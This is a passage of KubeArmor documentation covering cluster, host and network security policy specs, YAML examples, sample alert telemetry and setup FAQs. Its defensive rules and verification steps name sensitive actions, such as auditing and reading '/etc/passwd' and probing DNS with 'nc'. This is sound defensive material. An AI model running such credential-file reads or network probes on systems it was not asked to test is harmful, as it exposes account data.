    * Verification: After applying this policy, please get into one of the containers in the namespace 'nginx1' (using "kubectl -n nginx1 exec -it nginx-X-... -- bash") and run '/usr/bin/apt'. You will see that /usr/bin/apt is blocked. `apt` won't be blocked in a workload that doesn't have labels `app=nginx` OR `app=nginx-dev` in namespace `nginx1` and all the workloads across other namespaces.
  * Block accessing specific executable matching labels, NotIn operator ([csp-matchlabels-not-in-block-process.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/csp-matchlabels-not-in-block-process.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorClusterPolicy
    metadata:
      name: csp-matchlabels-not-in-block-process
    spec:
      severity: 8
      selector:
        matchExpressions:
          - key: namespace
            operator: NotIn
            values:
              - nginx2
          - key: label
            operator: NotIn
            values:
              - app=nginx
      process:
        matchPaths:
          - path: /usr/bin/apt
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of '/usr/bin/apt' in all the workloads who doesn't match the labels `app=nginx` AND not present in the namespace `nginx2` . For this, we define the 'nginx2' as value and operator as 'NotIn' for key `namespace` AND `app=nginx` value and operator as 'NotIn' for key `label` in selector -> matchExpressions and the specific path ('/usr/bin/apt') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please exec into any container within the namespace 'nginx2' and run '/usr/bin/apt'. You can see the operation is blocked. Then try to do same in other workloads present in different namespace and if they don't have label `app=nginx`, the operation will be blocked, in case container have label `app=nginx`, operation won't be blocked.
* File Access Restriction
  * Block accessing specific file ([csp-in-operator-block-file-access.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/nginx-csp/cluster-security-policies/csp-in-operator-block-file-access.yaml))

    ```yaml
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorClusterPolicy
    metadata:
      name: csp-in-operator-block-file-access
    spec:
      severity: 8
      selector:
        matchExpressions:
          - key: namespace
            operator: NotIn
            values:
              - nginx2
      file:
        matchPaths:
          - path: /etc/host.conf
            fromSource:
            - path: /usr/bin/cat
      action:
        Block

    ```

    * Explanation: The purpose of this policy is to block read access for '/etc/host.conf' in all the containers except the namespace 'bginx2'.
    * Verification: After applying this policy, please get into the container within the namespace 'nginx2' and run 'cat /etc/host.conf'. You can see the operation is not blocked and can see the content of the file. Now try to run 'cat /etc/host.conf' in container of 'nginx1' namespace, this operation should be blocked.

> **Note** Other operations like Network, Capabilities, Syscalls also behave in same way as in security policy. The difference only lies in how we match the cluster policy with the namespaces.

# Policy Spec for Nodes/VMs

## Policy Specification

Here is the specification of a host security policy.

```
apiVersion: security.kubearmor.com/v1
kind:KubeArmorHostPolicy
metadata:
  name: [policy name]

spec:
  severity: [1-10]                         # --> optional 
  tags: ["tag", ...]                       # --> optional
  message: [message]                       # --> optional

  nodeSelector:
    matchLabels:
      [key1]: [value1]
      [keyN]: [valueN]

  process:
    matchPaths:
    - path: [absolute executable path]
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      ownerOnly: [true|false]              # --> optional

  file:
    matchPaths:
    - path: [absolute file path]
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchDirectories:
    - dir: [absolute directory path]
      recursive: [true|false]              # --> optional
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional
      fromSource:                          # --> optional
      - path: [absolute exectuable path]
    matchPatterns:
    - pattern: [regex pattern]
      readOnly: [true|false]               # --> optional
      ownerOnly: [true|false]              # --> optional

  network:
    matchProtocols:
    - protocol: [TCP|tcp|UDP|udp|ICMP|icmp]
      fromSource:
      - path: [absolute exectuable path]

  device:
    matchDevice:
    - class: [class name|decimal|hex]
      subClass: [0-255]                    # --> optional
      protocol: [0-255]                    # --> optional
      level: [1-255]                       # --> optional

  capabilities:
    matchCapabilities:
    - capability: [capability name]
      fromSource:
      - path: [absolute exectuable path]

  action: [Audit|Block] (Block by default)
```

> **Note** Please note that for system calls monitoring we only support audit action no matter what the value of action is

For better understanding, you can check [the KubeArmorHostPolicy spec diagram](https://github.com/kubearmor/KubeArmor/blob/main/.gitbook/assets/kubearmorhostpolicy-spec-diagram.pdf).

## Policy Spec Description

Now, we will briefly explain how to define a host security policy.

* Common

  A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the name of a policy.

  ```
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorHostPolicy
    metadata:
      name: [policy name]
  ```

  Make sure that you need to use `KubeArmorHostPolicy`, not `KubeArmorPolicy`.
* Severity

  You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen.

  ```
  severity: [1-10]
  ```

* Tags

  The tags part is optional. You can define multiple tags (e.g., WARNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies.

  ```
  tags: ["tag1", ..., "tagN"]
  ```

* Message

  The message part is optional. You can add an alert message, and then the message will be presented in alert logs.

  ```
  message: [message]
  ```

* NodeSelector

  The node selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) nodes based on labels.

  ```
    nodeSelector:
      matchLabels:
        [key1]: [value1]
        [keyN]: [valueN]
  ```

  If you do not have any custom labels, you can use system labels as well.

  ```
      kubernetes.io/arch: [architecture, (e.g., amd64)]
      kubernetes.io/hostname: [host name, (e.g., kubearmor-dev)]
      kubernetes.io/os: [operating system, (e.g., linux)]
  ```

* Process

  In the process section, there are three types of matches: matchPaths, matchDirectories, and matchPatterns. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In the case of matchPatterns, advanced operators may be able to determine particular patterns for executables by using regular expressions. However, we generally do not recommend using this match.

  ```
    process:
      matchPaths:
      - path: [absolute executable path]
        ownerOnly: [true|false]            # --> optional
        fromSource:                        # --> optional
        - path: [absolute executable path]
      matchDirectories:
      - dir: [absolute directory path]
        recursive: [true|false]            # --> optional
        ownerOnly: [true|false]            # --> optional
        fromSource:                        # --> optional
        - path: [absolute exectuable path]
      matchPatterns:
      - pattern: [regex pattern]
        ownerOnly: [true|false]            # --> optional
  ```

  In each match, there are three options.

  * ownerOnly (static action: allow owner only; otherwise block all)

    If this is enabled, the owners of the executable(s) defined with matchPaths and matchDirectories will be only allowed to execute.
  * recursive

    If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories.
  * fromSource

    If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. For better understanding, let us say that an operator defines a policy as follows. Then, /bin/bash will be only allowed (blocked) to execute /bin/sleep. Otherwise, the execution of /bin/sleep will be blocked (allowed).

    ```
      process:
        matchPaths:
        - path: /bin/sleep
          fromSource:
          - path: /bin/bash
    ```

* File

  The file section is quite similar to the process section.

  ```
    file:
      matchPaths:
      - path: [absolute file path]
        readOnly: [true|false]             # --> optional
        ownerOnly: [true|false]            # --> optional
        fromSource:                        # --> optional
        - path: [absolute file path]
      matchDirectories:
      - dir: [absolute directory path]
        recursive: [true|false]            # --> optional
        readOnly: [true|false]             # --> optional
        ownerOnly: [true|false]            # --> optional
        fromSource:                        # --> optional
        - path: [absolute file path]
      matchPatterns:
      - pattern: [regex pattern]
        readOnly: [true|false]             # --> optional
        ownerOnly: [true|false]            # --> optional
  ```

  The only difference between 'process' and 'file' is the readOnly option.

  * readOnly (static action: allow to read only; otherwise block all)

    If this is enabled, the read operation will be only allowed, and any other operations (e.g., write) will be blocked.
* Network

  In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP.

  ```
    network:
      matchProtocols:
      - protocol: [protocol(,)]            # --> [ TCP | tcp | UDP | udp | ICMP | icmp ]
        fromSource:
        - path: [absolute file path]
  ```

* Device

  In the case of device, there is currently one match type: matchDevice. You can define specific USB device classes by class name or decimal/hex code, their corresponding sub classes, protocol and level of attachment. You can use `ALL` in class to match all USB device classes. A list of supported device class names is defined in [USB device class list](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/usb_device_handler.md), along with policy examples for some commonly used devices like keyboard, etc. Level matches the number of USB hub ancestors, for example 1 means attached directly to host, 2 means behind a hub and so on.

  ```
    device:
      matchDevice:
      - class: [class name|decimal|hex]
        subClass: [0-255]                   # --> optional
        protocol: [0-255]                   # --> optional
        level: [1-255]                      # --> optional
  ```

* Capabilities

  In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. You can check available capabilities in [Capability List](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/supported_capability_list.md).

  ```
    capabilities:
      matchCapabilities:
      - capability: [capability name(,)]
        fromSource:
        - path: [absolute file path]
  ```

* Syscalls

  In the case of syscalls, there are two types of matches, matchSyscalls and matchPaths. matchPaths can be used to target system calls targeting specific binary path or anything under a specific directory, additionally you can slice based on syscalls generated by a binary or a group of binaries in a directory. You can use matchSyscall as a more general rule to match syscalls from all sources or from specific binaries.

  ```
  syscalls:
    matchSyscalls:
    - syscall:
      - syscallX
      - syscallY
      fromSource:                            # --> optional
      - path: [absolute exectuable path]
      - dir: [absolute directory path]
        recursive: [true|false]              # --> optional
    matchPaths:
    - path: [absolute directory path | absolute exectuable path]
      recursive: [true|false]                # --> optional
      - syscall:
        - syscallX
        - syscallY
      fromSource:                            # --> optional
      - path: [absolute exectuable path]
      - dir: [absolute directory path]
        recursive: [true|false]              # --> optional
  ```

There is one options in each match.

* fromSource If a path is specified in fromSource, kubearmor will match only syscalls generated by the defined source. For better undrestanding, lets take the example below. Only unlink system calls generated by `/bin/bash` will be matched.

  ```
    process:
      matchPaths:
      - path: /bin/sleep
        - syscall:
          - unlink
        fromSource:
        - path: /bin/bash
  ```

* recursive

  If this is enabled, the coverage will extend to the subdirectories of the directory.
* Action

  The action could be Audit or Block in general. In order to use the Allow action, you should define 'fromSource'; otherwise, all Allow actions will be ignored by default.

  ```
    action: [Audit|Block]
  ```

  If 'fromSource' is defined, we can use all actions for specific rules.

  ```
    action: [Allow|Audit|Block]
  ```

  For System calls monitoring, we only support audit mode no matter what the action is set to.

# Policy Examples for Nodes/VMs

Here, we demonstrate how to define host security policies.

* Process Execution Restriction
  * Block a specific executable ([hsp-kubearmor-dev-proc-path-block.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/host-security-policies/hsp-kubearmor-dev-proc-path-block.yaml))

    ```
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorHostPolicy
    metadata:
      name: hsp-kubearmor-dev-proc-path-block
    spec:
      nodeSelector:
        matchLabels:
          kubernetes.io/hostname: kubearmor-dev
      severity: 5
      process:
        matchPaths:
        - path: /usr/bin/diff
      action:
        Block
    ```

    * Explanation: The purpose of this policy is to block the execution of '/usr/bin/diff' in a host whose host name is 'kubearmor-dev'. For this, we define 'kubernetes.io/hostname: kubearmor-dev' in nodeSelector -> matchLabels and the specific path ('/usr/bin/diff') in process -> matchPaths. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please open a new terminal (or connect to the host with a new session) and run '/usr/bin/diff'. You will see that /usr/bin/diff is blocked.

    **NOTE**

    The given policy works with almost every linux distribution. If it is not working in your case, check the process location. The following location shows location of `sleep` binary in different ubuntu distributions:

    * In case of *Ubuntu 20.04* : /usr/bin/sleep
    * In case of *Ubuntu 18.04* : /bin/sleep
* File Access Restriction
  * Audit a critical file access ([hsp-kubearmor-dev-file-path-audit.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/multiubuntu/security-policies/hsp-kubearmor-dev-file-path-audit.yaml))

    ```
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorHostPolicy
    metadata:
      name: hsp-kubearmor-dev-file-path-audit
    spec:
      nodeSelector:
        matchLabels:
          kubernetes.io/hostname: kubearmor-dev
      severity: 5
      file:
        matchPaths:
        - path: /etc/passwd
      action:
        Audit
    ```

    * Explanation: The purpose of this policy is to audit any accesses to a critical file (i.e., '/etc/passwd'). Since we want to audit one critical file, we use matchPaths to specify the path of '/etc/passwd'.
    * Verification: After applying this policy, please open a new terminal (or connect to the host with a new session) and run 'sudo cat /etc/passwd'. Then, check the alert logs of KubeArmor.
* System calls alerting

  * Alert for all `unlink` syscalls

  ```
  apiVersion: security.kubearmor.com/v1
  kind: KubeArmorHostPolicy
  metadata:
    name: audit-all-unlink
  spec:
    severity: 3
    nodeSelector:
          matchLabels:
            kubernetes.io/hostname: vagrant
    syscalls:
      matchSyscalls:
      - syscall:
        - unlink
    action:
      Audit
  ```

<details>

<summary>Generated telemetry</summary>

```json
{
  "Timestamp": 1661937152,
  "UpdatedTime": "2022-08-31T09:12:32.967304Z",
  "ClusterName": "default",
  "HostName": "vagrant",
  "HostPPID": 8563,
  "HostPID": 310459,
  "PPID": 8563,
  "PID": 310459,
  "UID": 1000,
  "ProcessName": "/usr/bin/unlink",
  "PolicyName": "audit-all-unlink",
  "Severity": "3",
  "Type": "MatchedHostPolicy",
  "Source": "/usr/bin/unlink /home/vagrant/secret.txt",
  "Operation": "Syscall",
  "Resource": "/home/vagrant/secret.txt",
  "Data": "syscall=SYS_UNLINK",
  "Action": "Audit",
  "Result": "Passed"
}
```

</details>

* Alert on all `rmdir` syscalls targeting anything in `/home/` directory and sub-directories

```
apiVersion: security.kubearmor.com/v1
kind: KubeArmorHostPolicy
metadata:
  name: audit-home-rmdir
spec:
  severity: 3
  nodeSelector:
        matchLabels:
          kubernetes.io/hostname: vagrant
  syscalls:
    matchPaths:
    - syscall:
      - rmdir
      path: /home/
      recursive: true
  action:
    Audit
```

<details>

<summary>Generated telemetry</summary>

```json
{
  "Timestamp": 1661936983,
  "UpdatedTime": "2022-08-31T09:09:43.894787Z",
  "ClusterName": "default",
  "HostName": "vagrant",
  "HostPPID": 308001,
  "HostPID": 308002,
  "PPID": 308001,
  "PID": 308002,
  "ProcessName": "/usr/bin/rmdir",
  "PolicyName": "audit-home-rmdir",
  "Severity": "3",
  "Type": "MatchedHostPolicy",
  "Source": "/usr/bin/rmdir jane-doe",
  "Operation": "Syscall",
  "Resource": "/home/jane-doe",
  "Data": "syscall=SYS_RMDIR",
  "Action": "Audit",
  "Result": "Passed"
}
```

</details>

# Network Policy Spec for Nodes/VMs

## Policy Specification

The policy specification of KubeArmor Network Policy is similar to the specification of [Kubernetes Network Policy](https://kubernetes.io/docs/concepts/services-networking/network-policies/) with a few changes. Here is the specification of a network security policy.

```
apiVersion: security.kubearmor.com/v1
kind:KubeArmorNetworkPolicy
metadata:
  name: [policy name]

spec:
  severity: [1-10]                         # --> optional 
  tags: ["tag", ...]                       # --> optional
  message: [message]                       # --> optional

  nodeSelector:
    matchLabels:
      [key1]: [value1]
      [keyN]: [valueN]

  ingress:
  - from:
    - ipBlock:
        cidr: [IP address range]
    iface: [if1, ...]
    ports:
    - protocol: [TCP|tcp|UDP|udp|SCTP|sctp]
      port: [http|https|ssh|dns OR "port number"]
      endPort: [port number]

  egress:
  - to:
    - ipBlock:
        cidr: [IP address range]
    iface: [if1, ...]
    ports:
    - protocol: [TCP|tcp|UDP|udp|SCTP|sctp]
      port: [http|https|ssh|dns OR "port number"]
      endPort: [port number]

  action: [Audit|Allow|Block]
```

## Policy Spec Description

Now, we will briefly explain how to define a host security policy.

* Common

  A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the name of a policy.

  ```
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorNetworkPolicy
    metadata:
      name: [policy name]
  ```

  Make sure that you need to use `KubeArmorNetworkPolicy`.
* Severity

  You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen.

  ```
  severity: [1-10]
  ```

* Tags

  The tags part is optional. You can define multiple tags (e.g., WARNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies.

  ```
  tags: ["tag1", ..., "tagN"]
  ```

* Message

  The message part is optional. You can add an alert message, and then the message will be presented in alert logs.

  ```
  message: [message]
  ```

* NodeSelector

  The node selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) nodes based on labels.

  ```
    nodeSelector:
      matchLabels:
        [key1]: [value1]
        [keyN]: [valueN]
  ```

  If you do not have any custom labels, you can use system labels as well.

  ```
      kubernetes.io/arch: [architecture, (e.g., amd64)]
      kubernetes.io/hostname: [host name, (e.g., kubearmor-dev)]
      kubernetes.io/os: [operating system, (e.g., linux)]
  ```

* Ingress

  In the Ingress section, there are three types of matches: from, iface and ports. You can define source IP address ranges (IPv4 and IPv6) using the from. A list of network interfaces can be defined using iface. Destination port and protocol can be defined using ports. Port (string) can be defined using name or number, protocol using name and an optional endPort can be defined to specify a port range (from port to endPort).

  ```
  ingress:
  - from:
    - ipBlock:
        cidr: [IP address range]
    iface: [if1, ...]
    ports:
    - protocol: [TCP|tcp|UDP|udp|SCTP|sctp]
      port: [http|https|ssh|dns OR "port number"]
      endPort: [port number]
  ```

* Egress

  Similarly in the Egress section, there are three types of matches: to, iface and ports. You can define destination IP address ranges (IPv4 and IPv6) using the to. A list of network interfaces can be defined using iface. Destination port and protocol can be defined using ports. Port (string) can be defined using name or number, protocol using name and an optional endPort can be defined to specify a port range (from port to endPort).

  ```
  egress:
  - to:
    - ipBlock:
        cidr: [IP address range]
    iface: [if1, ...]
    ports:
    - protocol: [TCP|tcp|UDP|udp|SCTP|sctp]
      port: [http|https|ssh|dns OR "port number"]
      endPort: [port number]
  ```

* Action

  The action could be Audit, Allow or Block.

  ```
    action: [Allow|Audit|Block]
  ```

# Network Policy Examples for Nodes/VMs

Here, we demonstrate how to define network security policies.

* DNS lookup restriction
  * Block outgoing DNS traffic ([nsp-egress-block-dns.yaml](https://github.com/kubearmor/KubeArmor/blob/main/examples/network-security-policies/nsp-egress-block-dns.yaml))

    ```
    apiVersion: security.kubearmor.com/v1
    kind: KubeArmorNetworkPolicy
    metadata:
      name: nsp-egress-block-dns
    spec:
      nodeSelector:
        matchLabels:
          kubernetes.io/hostname: "kubearmor-dev"
      egress:
      - to:
        - ipBlock:
            cidr: "8.8.8.8/32"
        ports:
        - port: "dns"
          protocol: "UDP"
      severity: 5
      action: Block
    ```

    * Explanation: The purpose of this policy is to audit the outgoing DNS packets (UDP) to 8.8.8.8 in a host whose host name is 'kubearmor-dev'. For this, we define 'kubernetes.io/hostname: kubearmor-dev' in nodeSelector -> matchLabels and the specific address ('8.8.8.8') in egress -> to and port + protocol ('dns' and 'UDP') egress -> ports. Also, we put 'Block' as the action of this policy.
    * Verification: After applying this policy, please open a new terminal (or connect to the host with a new session) and run `nc -uvz -w 2 8.8.8.8 53`. You will see that it runs without an output and an alert is generated.

    **NOTE**

    The given policy works with almost every linux distribution. If it is not working in your case, check if nftables is enabled on your system.
* Ingress alerting

  * Alert for incoming SSH connections

  ```
  apiVersion: security.kubearmor.com/v1
  kind: KubeArmorNetworkPolicy
  metadata:
    name: nsp-ingress-audit-ssh
  spec:
    nodeSelector:
      matchLabels:
        kubearmor.io/hostname: "ubuntu"
    ingress:
    - from:
      - ipBlock:
          cidr: "192.168.29.0/24"
      ports:
      - port: "ssh"
    message: "New SSH connection!"
    severity: 5
    action: Audit
  ```

# Profiling of Kubearmor Logs using karmor

`karmor profile` provides a real-time terminal UI that visualizes security-relevant activity observed by KubeArmor, including Process, File, and Network events. It fetches live data from the KubeArmor logs API, displays counters and key details for each event type, and supports easy navigation and filtering.

![Profile](https://user-images.githubusercontent.com/23097199/213850468-2462e8b2-b4f6-491f-a174-42d217cbfd28.gif)

## 🔍 Filtering Logs with `karmor profile`

The `karmor profile` command allows you to filter logs or alerts using a set of useful flags. These filters help narrow down the output to specific Kubernetes objects like containers, pods, and namespaces.

## 🧰 Available Filters

| Flag                | Description                               |
| ------------------- | ----------------------------------------- |
| `-c`, `--container` | Filters logs by **container name**.       |
| `-n`, `--namespace` | Filters logs by **Kubernetes namespace**. |
| `--pod`             | Filters logs by **pod name**.             |

***

## 📌 Usage Examples

### ✅ Filter by Container Name

```bash
karmor profile -c nginx
```

> Outputs logs only from the container named `nginx`.

***

### ✅ Filter by Namespace

```bash
karmor profile -n nginx1
```

> Outputs logs only from the namespace `nginx1`.

***

### ✅ Filter by Pod

```bash
karmor profile --pod nginx-pod-1
```

> Outputs logs only from the pod named `nginx-pod-1`.

***

## 🔗 Combine Multiple Filters

You can combine filters to narrow down the logs even further.

```bash
karmor profile -n nginx1 -c nginx
```

> Outputs logs **only** from the `nginx` container in the `nginx1` namespace.

***

## 💡 Tip

Use these filters during profiling sessions to quickly isolate behavior or security events related to a specific pod, container, or namespace.

# FAQs

<details>

<summary><strong>What platforms are supported by KubeArmor? How can I check whether my deployment will be supported?</strong></summary>

* Please check [Support matrix for KubeArmor](https://docs.kubearmor.io/kubearmor/quick-links/support_matrix).
* Use `karmor probe` to check if the platform is supported.

</details>

<details>

<summary><strong>I am applying a blocking policy but it is not blocking the action. What can I check?</strong></summary>

#### Checkout Binary Path

If the path in your process rule is not an absolute path but a symlink, policy enforcement won't work. This is because KubeArmor sees the actual executable path in events received from kernel space and is not aware about symlinks.

Policy enforcement on symbolic links like `/usr/bin/python` doesn't work and one has to specify the path of the actual executable that they link to.

#### Checkout Platform Support

Check `karmor probe` output and check whether `Container Security` is false. If it is false, the KubeArmor enforcement is not supported on that platform. You should check the [KubeArmor Support Matrix](https://docs.kubearmor.io/kubearmor/quick-links/support_matrix) and if the platform is not listed there then raise a new issue or connect to kubearmor community of [slack](https://cloud-native.slack.com/archives/C07EF44HWQM).

#### Checkout Default Posture

If you are applying an Allow-based policies and expecting unknown actions to be blocked, please make sure to check the [default security posture](https://docs.kubearmor.io/kubearmor/documentation/default_posture). The default security posture is set to Audit by default since KubeArmor v0.7.

</details>

<details>

<summary><strong>How is KubeArmor different from PodSecurityPolicy/PodSecurityContext?</strong></summary>

Native k8s supports specifying a security context for the pod or container. It requires one to specify native AppArmor, SELinux, seccomp policies. But there are a few problems with this approach:

* All the OS distributions do not support the LSMs consistently. For e.g, [GKE COS](https://cloud.google.com/container-optimized-os/) supports AppArmor while [Bottlerocket](https://aws.amazon.com/bottlerocket/) supports SELinux and BPF-LSM.
* The Pod Security Context expect the security profile to be specified in its native language, for instance, AppArmor profile for AppArmor. SELinux profile if SELinux is to be used. The profile language is extremely complex and this complexity could backfire i.e, it could lead to security holes.
* Security Profile updates are manual and difficult: When an app is updated, the security posture might change and it becomes difficult to manually update the native rules.
* No alerting of LSM violation on managed cloud platforms: By default LSMs send logs to kernel auditd, which is not available on most managed cloud platforms.

KubeArmor solves all the above mentioned problems.

* It maps YAML rules to LSMs (apparmor, bpf-lsm) rules so prior knowledge of different security context (native AppArmor, SELinux) is not required.
* It's easy to deploy: KubeArmor is deployed as a daemonset. Even when the application is updated, the enforcement rules are automatically applied.
* Consistent Alerting: KubeArmor handles kernel events and maps k8s metadata using ebpf.
* KubeArmor also runs in systemd mode so can directly run and protect Virtual Machines or Bare-metal machines too.
* Pod Security Context cannot leverage BPF-LSM at all today. BPF-LSM provides more programmatic control over the policy rules.
* Pod Security Context do not manage abstractions. As an example, you might have two nodes with Ubuntu, two nodes with Bottlerocket. Ubuntu, by default has AppArmor and Bottlerocket has BPF-LSM and SELinux. KubeArmor internally picks the right primitives to use for enforcement and the user do not have to bother explicitly stating what to use.

</details>

<details>

<summary><strong>What is visibility that I hear of in KubeArmor and how to get visibility information?</strong></summary>

KubeArmor, apart from been a policy enforcement engine also emits pod/container visibility data. It uses an eBPF-based system monitor which keeps track of process life cycles in containers and even nodes, and converts system metadata to container/node identities. This information can then be used for observability use-cases.

Sample output `karmor logs --json`:

```json
{
  "Timestamp": 1639803960,
  "UpdatedTime": "2021-12-18T05:06:00.077564Z",
  "ClusterName": "Default",
  "HostName": "pandora",
  "HostPID": 3390423,
  "PPID": 168556,
  "PID": 3390423,
  "UID": 1000,
  "PolicyName": "hsp-kubearmor-dev-proc-path-block",
  "Severity": "1",
  "Type": "MatchedHostPolicy",
  "Source": "zsh",
  "Operation": "Process",
  "Resource": "/usr/bin/sleep",
  "Data": "syscall=SYS_EXECVE",
  "Action": "Block",
  "Result": "Permission denied"
}
```

Here the log implies that the process /usr/bin/sleep execution by 'zsh' was denied on the Host using a block based host policy.

The logs are also exportable in [OpenTelemetry format](https://github.com/kubearmor/otel-adapter).

[Detailed KubeArmor events spec](https://docs.kubearmor.io/kubearmor/documentation/kubearmor-events).

</details>

<details>

<summary><strong>How to visualize KubeArmor visibility logs?</strong></summary>

There are a couple of community maintained dashboards available at [kubearmor/kubearmor-dashboards](https://github.com/kubearmor/kubearmor-dashboards).

If you don't find an existing dashboard particular to your needs, feel free to create an issue. It would be really great if you could also contribute one!

</details>

<details>

<summary><strong>How to fix `karmor logs` timing out?</strong></summary>

`karmor logs` internally uses Kubernetes' client's port-forward. Port forward is not meant for long running connection and it times out if left idle. Checkout this [StackOverflow answer](https://stackoverflow.com/questions/47484312/kubectl-port-forwarding-timeout-issue) for more info.

If you want to stream logs reliably there are a couple of solutions you can try:

1. Modiy the `kubearmor` service in `kubearmor` namespace and change the service type to `NodePort`. Then run karmor with:

```bash
karmor logs --gRPC=<address of the kubearmor node-port service>
```

This will create a direct, more reliable connection with the service, without any internal port-forward.

1. If you want to stream logs to external tools (fluentd/splunk/ELK etc) checkout [Streaming KubeArmor events](https://github.com/kubearmor/kubearmor-relay-server#streaming-kubearmor-events-to-external-siem-tools).

The community has created adapters and dashboards for some of these tools which can be used out of the box or as reference for creating new adapters. Checkout the previous question for more information.

</details>

<details>

<summary><strong>How to get process events in the context of a specific pods?</strong></summary>

Following command can be used to to get pod specific events:

`karmor log --pod <pod_name>`\
`karmor log` has following filter to provide more granularity:

```
--container - Specify container name for container specific logs
--logFilter <system|policy|all> - Filter to either receive system logs or alerts on policy violation
--logType <ContainerLog|HostLog> - Source of logs - ContainerLog: logs from containers or HostLog: logs from the host
--namespace - Specify the namespace for the running pods
--operation <Process|File|Network> - Type of logs based on process, file or network

```

</details>

<details>

<summary><strong>How is KubeArmor different from admission controllers?</strong></summary>

Kubernetes admission controllers are set of extensions that acts as a gatekeeper and help govern and control Kubernetes clusters. They intercept requests to the Kubernetes API server prior to the persistence of the object into etcd.

They can manage deployments requesting too many resources, enforce pod security policies, prevent vulnerable images from being deployed and check if the pod is running in privileged mode.\
But all these checks are done before the pods are started. Admission controllers doesn't guarantee any protection once the vulnerability is inside the cluster.

KuberArmor protects the pods from within. It runs as a daemonset and restricts the behavior of containers at the system level. KubeArmor allows one to define security policies for the assets/resources (such as files, processes, volumes etc) within the pod/container, select those based on K8s metadata and simply apply these security policies at runtime.

It also detects any policy violations and generates audit logs with container identities. Apart from containers, KuberArmor also allows protecting the Host itself.

</details>

<details>

<summary><strong>What are the Policy Actions supported by KubeArmor?</strong></summary>

KubeArmor defines 3 policy actions: Allow, Block and Audit.\
**Allow**: A whitelist policy or a policy defined with `Allow` action allows only the operations defined in the policy, rest everything is blocked/audited. **Block**: Policy defined with `Block` action blocks all the operations defined in the policy.\
**Audit**: An applied `Audit` policy doesn't block any action but instead provides alerts on policy violation. This type of policy can be used for "dry-run" before safely applying a security policy in production.

If Block policy is used and there are no supported enforcement mechanism on the platform then the policy enforcement wouldn't be observed. But we will still be able to see the observability data for the applied Block policy, which can help us in identifying any suspicious activity.

</details>

<details>

<summary><strong>How to use KubeArmor on Oracle K8s engine?</strong></summary>

KubeArmor supports enforcement on OKE leveraging the BPF-LSM. The default kernel for Oracle Linux 8.6 (OL 8.6) is UEK R6 kernel-uek-5.4.17-2136.307.3 which does not support BPF-LSM.

Unbreakable Enterprise Kernel Release 7 (UEK R7) is based on Linux kernel 5.15 LTS that supports BPF-LSM and it's available for Oracle Linux 8 Update 5 onwards.

#### Installing UEK 7 on OL 8.6

UEK R7 can be installed on OL 8.6 by following the easy-to-follow instructions provided here in this [Oracle Blog Post](https://blogs.oracle.com/post/uek-7-oracle-linux-8).

> Note: After upgrading to the UEK R7 you may required to enable BPF-LSM if it's not enabled by default.

</details>

<details>

<summary><strong>Checking and Enabling support for BPF-LSM</strong></summary>

#### Checking if BPF-LSM is supported in the Kernel

> Note: KubeArmor now supports upgrading the nodes to BPF-LSM using [an updater daemonset](#kubearmor-enforcement-is-not-enabledworking). The following text is just an FYI but need not be used manually for k8s env.

We check for BPF LSM Support in Kernel Config

```sh
cat /boot/config-$(uname -r) | grep -e "BPF" -e "BTF"
```

Following flags need to exist and set to `y`

```ini
CONFIG_BPF=y
CONFIG_BPF_SYSCALL=y
CONFIG_BPF_JIT=y
CONFIG_BPF_LSM=y
CONFIG_DEBUG_INFO=y
CONFIG_DEBUG_INFO_BTF=y
```

**Note**: These config could be in other places too like `/boot/config`, `/usr/src/linux-headers-$(uname -r)/.config`, `/lib/modules/$(uname -r)/config`, `/proc/config.gz`.

#### Checking if BPF-LSM is enabled

* check if bpf is enabled by verifying if it is in the active lsms.

  ```sh
  $ cat /sys/kernel/security/lsm
  capability,yama,selinux,bpf
  ```

  as we can see here `bpf` is in active lsms

#### Enabling BPF-LSM manually using boot configs

* Open the `/etc/default/grub` file in privileged mode.

  ```sh
  sudo vi /etc/default/grub
  ```

* Append the following to the `GRUB_CMDLINE_LINUX` variable and save.

  ```
  GRUB_CMDLINE_LINUX="lsm=lockdown,capability,yama,apparmor,bpf"
  ```

* Update grub config:

  ```sh
  # On Debian like systems
  sudo update-grub
  ```

  OR

  ```sh
  # On RHEL like systems
  sudo grub2-mkconfig -o /boot/grub2.cfg
  ```

* Reboot into your kernel.

  ```sh
  sudo reboot
  ```

